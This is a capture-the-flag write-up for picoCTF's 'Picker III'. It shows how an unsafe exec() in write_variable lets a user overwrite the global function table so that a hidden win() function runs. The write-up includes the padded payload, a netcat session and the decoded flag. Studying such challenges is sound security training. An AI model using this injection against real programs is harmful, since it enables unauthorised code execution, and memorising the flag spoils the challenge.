**Challenge**
	
**Description**
	Can you figure out how this program works to get the flag?
	Connect to the program with netcat:`$ nc saturn.picoctf.net 49709`
	The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/526/picker-III.py).
	**Hints**
		1. Is there any way to modify the function table?

**Solution**
	1. Download and analyze `picker-III.py`.
	2. The program no longer uses `eval(user_input)` directly.  
	    Instead, it uses a **function table**:
		<script>
			func_table = '''
				print_table  
				read_variable  
				write_variable  
				getRandomNumber  
				'''
		</script>
		- Only these functions can be executed via options `1–4`.
	3. There is a hidden function:
		<script>
			def win():
			    flag = open('flag.txt', 'r').read()
		</script>
		- But it is **not in the function table**, so you cannot call it directly.
	4. The key function is:
		<script>
			def write_variable():
			    exec('global '+var_name+'; '+var_name+' = '+value)
		</script>
		- This lets you **modify global variables**.
	5. Important detail:
		- `func_table` is a global variable
		- It stores function names as a string
		- Each entry has fixed size (`32 bytes`)
	6. The vulnerability:
		- You can overwrite `func_table` using `write_variable()`.
		- Replace one of the entries with `win`.
	7. **Important constraint:**
		1. The function table must be **exactly 128 characters long**.
		2. This comes from the code:
			- `FUNC_TABLE_ENTRY_SIZE = 32`
			- `FUNC_TABLE_SIZE = 4` 
			-  32 × 4 = 128 characters total.
		3. Each function occupies **exactly 32 characters** inside the table.
		4. The program reads functions by fixed positions, so the size must match.
		5. If the length is incorrect → `"Table corrupted"`.
			So, we replace one entry with `"win"` and pad it with spaces to reach 32 characters.
		6. Use option `3` (`write_variable`).
		7. Overwrite `func_table` with:
			`"win                             read_variable                   write_variable                  getRandomNumber                 "`.
		8. Keeps the correct size (128 chars).
		9. Each entry is 32 chars.
		10. First function becomes `win`.
		<script clss = 'kali'>
			┌──(kali㉿kali)-[~]
			└─$ nc saturn.picoctf.net 49709
			==> help
		
			This program fixes vulnerabilities in its predecessor by limiting what
			functions can be called to a table of predefined functions. This still puts
			the user in charge, but prevents them from calling undesirable subroutines.
		
			* Enter 'quit' to quit the program.
			* Enter 'help' for this text.
			* Enter 'reset' to reset the table.
			* Enter '1' to execute the first function in the table.
			* Enter '2' to execute the second function in the table.
			* Enter '3' to execute the third function in the table.
			* Enter '4' to execute the fourth function in the table.
		
			Here's the current table:
			
			1: print_table
			2: read_variable
			3: write_variable
			4: getRandomNumber
			==> 3
			Please enter variable name to write: func_table
			Please enter new value of variable: "win                             read_variable                   write_variable                  getRandomNumber                 "
			==> 1
			0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
			==> 
		</script>
	8. Now we decode the hex format into ASCII with the code [[Files 03/solveHex.py]].
	9. Flag: `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}`.

**Notes**
	

**References**
	